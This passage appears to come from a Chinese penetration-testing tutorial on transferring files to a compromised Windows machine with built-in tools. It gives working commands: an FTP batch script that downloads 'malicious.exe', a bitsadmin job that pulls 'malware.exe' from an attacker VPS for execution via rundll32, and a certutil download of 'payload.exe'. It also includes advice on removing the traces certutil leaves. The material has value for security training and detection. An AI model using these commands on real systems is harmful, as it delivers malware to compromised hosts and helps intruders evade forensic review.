以下是利用FTP传输文件的一个典型脚本示例：
```batch
echo open 192.168.1.100 2121 > ftp.txt
echo anonymous >> ftp.txt
echo >> ftp.txt
echo get malicious.exe >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt
```
这个脚本会连接IP为192.168.1.100、端口为2121的FTP服务器，以匿名用户身份登录，然后下载名为`malicious.exe`的文件。

## Bitsadmin命令行工具

![](img/35006dbde9439a9fa7742debd5b35ef2_59.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_61.png)

上一节我们介绍了FTP，本节中我们来看看Windows系统自带的另一个强大工具——Bitsadmin。Bitsadmin是一个命令行工具，可用于创建、下载或上传作业并监视其进度。

![](img/35006dbde9439a9fa7742debd5b35ef2_63.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_65.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_66.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_68.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_69.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_71.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_73.png)

以下是使用Bitsadmin下载文件的步骤：
1.  在攻击机（如VPS）上放置需要传输的文件（例如一个木马文件）。
2.  在已获得权限的目标机上执行Bitsadmin命令下载该文件。

具体命令格式如下：
```cmd
bitsadmin /transfer myjob /download /priority high http://your-vps-ip/malware.exe C:\Windows\Temp\malware.exe
```
这条命令会创建一个名为`myjob`的下载作业，从指定的URL下载文件，并保存到本地的`C:\Windows\Temp\`目录下。下载完成后，再通过其他命令（如`rundll32`）执行该文件。

最后，我们介绍Certutil。Certutil同样是Windows系统自带的命令行程序，主要用于证书服务管理，但也可以被用来下载文件。

使用Certutil下载文件非常简单，命令格式如下：
```cmd
certutil -urlcache -split -f http://your-vps-ip/payload.exe payload.exe
```
参数解释：
*   `-urlcache`：显示或删除URL缓存条目。
*   `-split`：将嵌入的ASN.1元素保存到单独的文件中。
*   `-f`：强制覆盖现有文件。

![](img/35006dbde9439a9fa7742debd5b35ef2_93.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_95.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_97.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_99.png)

![](img/35006dbde9439a9fa7742debd5b35ef2_101.png)

执行该命令后，文件将从指定URL下载并保存为本地文件。需要注意的是，使用Certutil下载文件后，会在`%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`目录下留下缓存文件，在渗透测试后需要清理痕迹。
